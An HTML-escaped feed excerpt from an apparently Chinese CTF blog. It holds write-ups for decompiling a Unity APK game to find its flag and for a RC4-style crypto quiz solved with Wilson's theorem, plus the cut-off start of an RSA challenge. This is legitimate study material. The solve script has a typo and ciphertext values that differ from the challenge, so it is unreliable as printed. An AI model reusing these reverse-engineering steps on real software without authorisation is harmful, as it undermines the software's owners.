.rodata:00000000004D3C6A                 db  6Fh ; o
.rodata:00000000004D3C6B                 db  67h ; g
.rodata:00000000004D3C6C                 db  6Fh ; o
.rodata:00000000004D3C6D                 db  67h ; g
.rodata:00000000004D3C6E                 db  6Fh ; o
.rodata:00000000004D3C6F                 db  7Dh ; }
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mrctf2020pixelshooter&#34;&gt;[MRCTF2020]PixelShooter&lt;/h2&gt;
&lt;p&gt;先使用NoxPlayer打开这个apk，发现游戏结束后有个flag信息，说得分不够高，说明flag会在游戏结束时根据得分获得&lt;/p&gt;
&lt;p&gt;使用apktool解压&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ java -jar apktool_2.5.0.jar d PixelShooter.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个显然是unity3d逆向，找到 &lt;code&gt;/assets/bin/Data/Managed&lt;/code&gt;，使用 dnSpy打开 &lt;code&gt;Assembly-CSharp.dll&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;看到有个gameController，其中有个gameOver&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; GameOver()
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.isGameOver = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.UI.GetComponent&amp;lt;UIController&amp;gt;().GameOver(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.score, &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.bestScore);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (PlayerPrefs.HasKey(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bestScore&amp;#34;&lt;/span&gt;))
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.bestScore = Mathf.Max(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.score, PlayerPrefs.GetInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bestScore&amp;#34;&lt;/span&gt;));
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.bestScore = &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.score;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;base&lt;/span&gt;.GetComponent&amp;lt;AudioSource&amp;gt;().Stop();
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有个获取ui的函数，查看&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; GameOver(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; score, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; bestScore)
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.pad.SetActive(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
        Time.timeScale = &lt;span style=&#34;color:#ae81ff&#34;&gt;0f&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;您的飞机已坠毁\n&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bestScore &amp;lt; score)
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; text2 = text;
            text = &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;.Concat(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;[]
            {
                text2,
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;获得最高分:&amp;#34;&lt;/span&gt;,
                score,
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;!\n&amp;#34;&lt;/span&gt;
            });
            PlayerPrefs.SetInt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bestScore&amp;#34;&lt;/span&gt;, score);
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (score &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;)
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;少年继续努力！要拿到flag还差亿点点\n&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (score &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;战绩不错！但是要拿到flag还差亿点&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (score &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;)
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;惊人的成绩！！但是要拿到flag还差一点\n&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MRCTF{Unity_1S_Fun_233}\n&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (Time.time - &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lastTime &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15f&lt;/span&gt;)
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;以及，别作死啊！\n&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (Time.time - &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lastTime &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60f&lt;/span&gt;)
        {
            text += &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;以及注意闪避！&amp;#34;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.gameOverText.text = text;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.gameOverUI.SetActive(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拿到flag&lt;/p&gt;
</description>
        </item>
        <item>
        <title>AITMC-challenge</title>
        <link>/post/aitmc-challenge/</link>
        <pubDate>Wed, 09 Dec 2020 23:27:25 +0000</pubDate>
        
        <guid>/post/aitmc-challenge/</guid>
        <description>&lt;h2 id=&#34;quiz-from-bzb&#34;&gt;Quiz from bzb&lt;/h2&gt;
&lt;h3 id=&#34;前言题目&#34;&gt;前言&amp;amp;题目&lt;/h3&gt;
&lt;p&gt;前段时间学习信安数基，助教学长就配套出了道Quiz，来给我们练手。&lt;/p&gt;
&lt;p&gt;先上题目&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; math
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; bytes_to_long
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; getRandomNBitInteger
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; getPrime
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; isPrime
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; inverse
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; secret &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; flag

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nextPrime&lt;/span&gt;(n):
    n &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; isPrime(n):
        n &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; n

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;init&lt;/span&gt;(S, K):
    j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    K &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(K)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(K)):
        K[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(K[i])
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
        S&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(i)
        k&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(K[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(K)])
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Encrypt&lt;/span&gt;(key, D):
    S&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
    init(S, key)
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; D:
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(a)
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
        k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chr(a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; S[(S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[j]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;])
        result &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; k
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Decrypt&lt;/span&gt;(key, D):
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    init(S, key)
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; D:
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(a)
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
        k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chr(a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; S[(S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[j]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;])
        result &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; k
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(getRandomNBitInteger(&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;))
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key =&amp;#39;&lt;/span&gt;, bytes_to_long(key)
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;)
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e =&amp;#39;&lt;/span&gt;, e

    E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nextPrime(e)
    f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; math&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factorial(e) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; E

    d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(f)

    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(Encrypt(key, d))
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c1 =&amp;#39;&lt;/span&gt;, c1

    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(Encrypt(key, flag))
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c2 =&amp;#39;&lt;/span&gt;, c2

&lt;span style=&#34;color:#75715e&#34;&gt;# e = 11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# c1 = 11792816667683654209610238149228683194178884298019505853565076663183883681365400495420305428570416004628438524072440231323696408946395141935772862600031614&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# c2 = 81946333492800053045881242964212560642046177081574600318494251620269838444004879162713842&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;思路&#34;&gt;思路&lt;/h3&gt;
&lt;p&gt;首先阅读主函数部分，显然这道题需要先通过e, E求解f，以此得到d，随后再利用d, c1, c2来求解flag。&lt;/p&gt;
&lt;h4 id=&#34;求解f&#34;&gt;求解f&lt;/h4&gt;
&lt;p&gt;题目中的 $f=e!\mathrm{mod} E$ ，但由于 e 过大，显然无法直接计算得到。观察发现，$e!$ 当中的绝大多数部分可以两两配对组成模 $E$ 的逆元，因此猜测可能存在类似于 $(E-1)!\equiv 1\ (\mathrm{mod}\ E)$ 的规律，如果满足这个规律，我们就可以通过计算 $\prod\limits_{i=e+1}^{E-1}i\ (\mathrm{mod}\ E)$ 的逆元得到f。&lt;/p&gt;
&lt;p&gt;经过几次简单的检验，猜测规律为 $(E-2)!\equiv 1\ (\mathrm{mod}\ E)$ （后得知为Wilson定理，当时还没学&amp;hellip;），因此只需要计算$tmp\equiv \prod\limits_{i=e+1}^{E-2}i\ (\mathrm{mod}\ E),\ f\cdot tmp\equiv 1\ (\mathrm{mod}\ E)$ 即可得到 $f$。&lt;/p&gt;
&lt;h4 id=&#34;求解flag&#34;&gt;求解flag&lt;/h4&gt;
&lt;p&gt;得到了 f 后，可以直接利用 &lt;code&gt;long_to_bytes(f)&lt;/code&gt; 来得到 d 。为求解 flag，初步设想为利用加密函数求解 key，随后直接利用解密函数求解 flag。阅读 &lt;code&gt;Encrypt&lt;/code&gt; 函数和 &lt;code&gt;Decrypt&lt;/code&gt; 函数后发现加解密函数完全一致，且实际的加解密过程只有异或运算，说明 d 到 c1 的运算步骤与 flag 到 c2 的运算步骤完全相同且可逆，因此求解时没必要求出 key。进一步分析后发现加密算法大致是将 key 转化成某个固定的数组，并与明文依次进行异或运算得到密文，也就是说经过了 init 函数和多次交换位置（交换的次序也是固定的）后的数列才是真正的密钥。&lt;/p&gt;
&lt;p&gt;因此，只需要将 c1, c2 和 d 转换成 bytes，然后对每一位取 &lt;code&gt;ord&lt;/code&gt; 后进行异或运算，组成的数字取 &lt;code&gt;chr&lt;/code&gt; 后加到答案字符串后面，即可得到 flag。&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;exp&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; math
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.libnum.modular &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; invmod
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; bytes_to_long
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; isPrime

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nextPrime&lt;/span&gt;(n):
    n &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; isPrime(n):
        n &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; n

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457&lt;/span&gt;
    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5120829596353532760839054347975234579355835073413768618360492980516438193909447500996222328143719619379838946544412967584025416378147246422705451415437468&lt;/span&gt;
    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17985907282297772406857113433926323639543183645704827789984971602150950301590677893419082&lt;/span&gt;
    E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nextPrime(e)
    f_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; E &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        f_1 &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; i
        f_1 &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; E
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; invmod(f_1, E)
    &lt;span style=&#34;color:#75715e&#34;&gt;# 以上为求解f的过程&lt;/span&gt;
    d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(f)
    c1_bytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(c1)
    c2_bytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lone_to_bytes(c2)
    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(c2_bytes)):
        flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(c2_bytes[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(c1_bytes[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(d[i]))
    print flag
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{Congratulation!_quiz1_passed!!!}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;das2020-aprilnot-rsa&#34;&gt;[DAS2020 April]not RSA&lt;/h2&gt;
&lt;h3 id=&#34;题目&#34;&gt;题目&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; gcd, invmod, s2n
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; isPrime
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; secret &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; flag
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104879397075344024438671231239628115011303349344697797964879592144922079000957&lt;/span&gt; 
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104879397075344024438671231239628115011303349344697797964879592144922079001013&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; isPrime(p) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; isPrime(q)
n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; q
